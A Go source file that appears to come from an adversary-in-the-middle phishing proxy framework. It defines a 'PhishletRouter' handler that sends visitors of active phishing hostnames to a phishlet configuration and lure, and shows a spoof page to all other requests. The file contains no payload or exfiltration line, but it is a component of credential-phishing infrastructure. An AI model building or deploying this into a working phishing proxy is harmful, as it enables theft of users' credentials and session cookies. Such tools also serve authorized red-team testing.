package request

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type PhishletResolver interface {
	ResolveHostname(hostname, urlPath string) (*aitm.PhishletDef, *aitm.PhishletConfig, *aitm.Lure, error)
}

type PhishletRouter struct {
	ActiveHostnameSet proxy.HostnameSet
	Resolver        PhishletResolver
	Spoof           proxy.Spoofer
}

func (h *PhishletRouter) Name() string { return "PhishletRouter" }

func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	hostname := strings.ToLower(req.Host)
	if !h.ActiveHostnameSet.Contains(hostname) {
		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
		return proxy.ErrShortCircuit
	}
	phishletDef, phishletCfg, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
	if err != nil {
		return fmt.Errorf("phishlet_router: resolving %q: %w", hostname, err)
	}
	ctx.Phishlet = phishletDef
	ctx.PhishletCfg = phishletCfg
	ctx.Lure = lure
	return nil
}

var _ proxy.RequestHandler = (*PhishletRouter)(nil)
